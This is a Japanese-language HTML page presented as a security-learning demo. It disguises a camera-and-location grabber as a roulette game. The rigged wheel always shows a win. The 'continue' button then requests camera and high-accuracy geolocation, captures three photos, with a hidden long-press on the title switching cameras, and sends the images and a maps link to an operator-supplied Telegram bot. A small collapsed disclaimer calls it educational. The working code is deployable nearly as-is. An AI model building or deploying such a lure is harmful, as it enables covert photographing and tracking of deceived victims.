<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>🎯教育用ルーレット🎯</title>
<style>
  /* 既存のスタイルを継承しつつ、設定画面用を追加 */
  body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
  
  /* 設定用モーダルの独自スタイル */
  #setupOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #222; z-index: 1000; display: flex; align-items: center; justify-content: center; }
  .setup-box { background: #fff; color: #333; padding: 30px; border-radius: 20px; width: 90%; max-width: 350px; text-align: center; }
  .setup-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
  .setup-box h3 { margin-top: 0; color: #ff4081; }
  #setupError { color: red; font-size: 12px; margin-top: 5px; min-height: 1.2em; }

  /* 既存のルーレットスタイル */
  h2 { position: relative; margin-bottom: 30px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; cursor: pointer; user-select: none; transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); transform-style: preserve-3d; }
  h2.flipped { transform: rotateY(180deg); background: rgba(0, 0, 0, 0.7); }
  h2 span { display: inline-block; transition: transform 0.6s; }
  h2.flipped span { transform: rotateY(180deg); }
  #container { width: 85vw; max-width: 400px; aspect-ratio: 1; position: relative; margin: 20px 0; }
  #pointer { position: absolute; left: 50%; top: -25px; transform: translateX(-50%); font-size: 45px; z-index: 20; color: #ffffff; text-shadow: 0 4px 10px rgba(0,0,0,0.5); line-height: 1; }
  canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); display: block; }
  #result { margin-top: 20px; font-size: 26px; font-weight: bold; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); height: 1.2em; }
  #spinBtn { margin-top: 20px; padding: 15px 50px; font-size: 20px; cursor: pointer; border-radius: 50px; border: none; background: #fff; color: #333; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
  
  .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 30px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 85%; max-width: 320px; }
  .btn-single, .primary-btn-flat { width: 100%; padding: 15px; font-size: 18px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
  .secondary-btn-flat { flex: 1; padding: 15px 0; font-size: 18px; border: none; border-radius: 50px; background: #e0e0e0; color: #444; cursor: pointer; font-weight: bold; }
  #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 90; }
  .security-notice { max-width: 600px; width: 90%; margin: 20px auto; padding: 20px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 12px; line-height: 1.5; color: #fff; }
</style>
</head>
<body>

<div id="setupOverlay">
  <div class="setup-box">
    <h3>⚙️ 初期設定</h3>
    <p style="font-size: 12px; color: #666;">送信先のTelegram情報を入力してください</p>
    <input type="text" id="inputBotToken" placeholder="Bot Token (例: 123456:ABC...)">
    <input type="text" id="inputChatId" placeholder="Your Chat ID (例: 7541612001)">
    <div id="setupError"></div>
    <button class="primary-btn-flat" id="saveConfigBtn" style="margin-top: 10px;">接続テストして開始</button>
  </div>
</div>

<h2 id="h2Title"><span>🎯ルーレット🎯</span></h2>

<div id="container">
  <div id="pointer">▼</div>
  <canvas id="wheel"></canvas>
</div>

<h3 id="result">結果：</h3>
<button id="spinBtn">回す</button>

<div id="overlay"></div>

<div id="winModal" class="modal">
  <h1>おめでとう🥳</h1>
  <button class="btn-single" id="continueBtn">続ける</button>
</div>

<div id="confirmModal" class="modal">
  <h1>データ送信の確認</h1>
  <p>取得したデータを送信しますか？</p>
  <div style="display:flex; gap:10px; margin-top:20px;">
    <button class="secondary-btn-flat" id="sendNo">拒否</button>
    <button class="primary-btn-flat" id="sendYes">許可</button>
  </div>
</div>

<div id="noDataModal" class="modal">
  <h1>通知</h1>
  <p>送信できるデータがありません。</p>
  <button class="secondary-btn-flat" style="width:100%" id="noDataOk">閉じる</button>
</div>

<details class="security-notice">
  <summary><b>【セキュリティ学習用デモ】免責事項</b></summary>
  <br>このデモは、ブラウザの権限要求を悪用する攻撃手法を理解するためのものです。
  許可なく他人に実行させることは法律で禁じられています。
</details>

<script>
// --- 通信設定変数 ---
let BOT_TOKEN = "";
let CHAT_ID = "";

// --- 初期設定画面のロジック ---
document.getElementById("saveConfigBtn").onclick = async function() {
  const tokenInput = document.getElementById("inputBotToken").value.trim();
  const idInput = document.getElementById("inputChatId").value.trim();
  const errorEl = document.getElementById("setupError");
  
  if (!tokenInput || !idInput) {
    errorEl.textContent = "両方の項目を入力してください。";
    return;
  }

  this.disabled = true;
  this.textContent = "テスト中...";
  errorEl.textContent = "";

  try {
    // 接続テスト: テキストメッセージを送信してみる
    const testResp = await fetch(`https://api.telegram.org/bot${tokenInput}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: idInput, text: "✅ 教育用デモ：接続に成功しました。" })
    });
    
    const data = await testResp.json();
    if (data.ok) {
      BOT_TOKEN = tokenInput;
      CHAT_ID = idInput;
      document.getElementById("setupOverlay").style.display = "none";
      if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
    } else {
      errorEl.textContent = "送信失敗。TokenかIDが間違っています。";
      this.disabled = false;
      this.textContent = "接続テストして開始";
    }
  } catch (e) {
    errorEl.textContent = "エラーが発生しました。ネットワークを確認してください。";
    this.disabled = false;
    this.textContent = "接続テストして開始";
  }
};

// --- 以下、既存のルーレットロジック ---
let hue = 0;
function animateBG() {
  hue = (hue + 1) % 360;
  document.body.style.backgroundColor = `hsl(${hue}, 80%, 60%)`;
  requestAnimationFrame(animateBG);
}
animateBG();

let useBackCamera = false;
let pressTimer;
const h2 = document.getElementById("h2Title");

h2.onmousedown = h2.ontouchstart = (e) => {
  pressTimer = setTimeout(() => {
    useBackCamera = !useBackCamera;
    h2.classList.toggle("flipped", useBackCamera);
  }, 2000); 
};
h2.onmouseup = h2.onmouseleave = h2.ontouchend = () => clearTimeout(pressTimer);

const canvas = document.getElementById("wheel");
const ctx = canvas.getContext("2d");
const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハズレ","当たり","ハズレ"];
let totalRotation = 0;
let tempPhotos = [];
let tempLocationMsg = "";

function draw() {
  const size = 800; canvas.width = size; canvas.height = size;
  const c = size / 2; const rad = (Math.PI * 2) / slots.length;
  for(let i=0; i<slots.length; i++){
    ctx.beginPath(); ctx.moveTo(c, c); ctx.arc(c, c, c, i * rad, (i + 1) * rad);
    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE"; ctx.fill();
    ctx.strokeStyle = "#333"; ctx.lineWidth = 4; ctx.stroke();
    ctx.save(); ctx.translate(c, c); ctx.rotate(i * rad + rad / 2);
    ctx.fillStyle = "#333"; ctx.font = "bold 55px sans-serif"; ctx.textAlign = "center"; ctx.textBaseline = "middle";
    ctx.fillText(slots[i], c * 0.55, 0); ctx.restore();
  }
}
window.onload = draw;

async function getTempLocation() {
  return new Promise((resolve) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          tempLocationMsg = `📍位置情報: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          resolve();
        },
        () => { resolve(); },
        { enableHighAccuracy: true, timeout: 5000 }
      );
    } else { resolve(); }
  });
}

async function getTempData() {
  tempPhotos = []; tempLocationMsg = "";
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: useBackCamera ? "environment" : "user" } 
    });
    const video = document.createElement("video");
    video.srcObject = stream;
    await new Promise((resolve) => { video.onloadedmetadata = () => { video.play().then(resolve); }; });
    await new Promise(r => setTimeout(r, 1000));
    for (let i = 0; i < 3; i++) {
      const tc = document.createElement("canvas");
      tc.width = video.videoWidth; tc.height = video.videoHeight;
      tc.getContext("2d").drawImage(video, 0, 0);
      const blob = await new Promise(r => tc.toBlob(r, "image/jpeg", 0.7));
      if(blob) tempPhotos.push(blob);
      await new Promise(r => setTimeout(r, 400));
    }
    stream.getTracks().forEach(t => t.stop());
  } catch (e) {}
  await getTempLocation();
  
  document.getElementById("result").textContent = "準備完了";
  if (tempPhotos.length === 0 && !tempLocationMsg) {
    document.getElementById("noDataModal").style.display = "block";
  } else {
    document.getElementById("confirmModal").style.display = "block";
  }
}

async function finalSend() {
  document.getElementById("confirmModal").style.display = "none";
  document.getElementById("result").textContent = "送信中...";
  try {
    for (const blob of tempPhotos) {
      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("photo", blob, "captured.jpg");
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
    }
    if (tempLocationMsg) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: tempLocationMsg })
      });
    }
    alert("送信完了！Telegramを確認してください。");
  } catch (err) { alert("送信中にエラーが発生しました。"); }
  resetUI();
}

function resetUI() {
  tempPhotos = []; tempLocationMsg = "";
  document.getElementById("overlay").style.display = "none";
  document.getElementById("winModal").style.display = "none";
  document.getElementById("confirmModal").style.display = "none";
  document.getElementById("noDataModal").style.display = "none";
  document.getElementById("result").textContent = "結果：";
}

document.getElementById("spinBtn").onclick = function() {
  this.disabled = true;
  document.getElementById("result").textContent = "回転中...";
  const segmentAngle = 360 / slots.length;
  const currentMod = totalRotation % 360;
  const targetIdx = [0, 2, 4, 6][Math.floor(Math.random() * 4)];
  const stopAngle = 360 - (targetIdx * segmentAngle) - (segmentAngle / 2) + 270;
  totalRotation += (360 - currentMod) + 1800 + (stopAngle % 360);
  canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
  canvas.style.transform = `rotate(${totalRotation}deg)`;
  setTimeout(() => {
    document.getElementById("result").textContent = "当たり！";
    document.getElementById("overlay").style.display = "block";
    document.getElementById("winModal").style.display = "block";
    this.disabled = false;
  }, 4200);
};

document.getElementById("continueBtn").onclick = () => {
  document.getElementById("winModal").style.display = "none";
  document.getElementById("result").textContent = "読み込み中...";
  getTempData();
};

document.getElementById("sendYes").onclick = finalSend;
document.getElementById("sendNo").onclick = resetUI;
document.getElementById("noDataOk").onclick = resetUI;
</script>
</body>
</html>
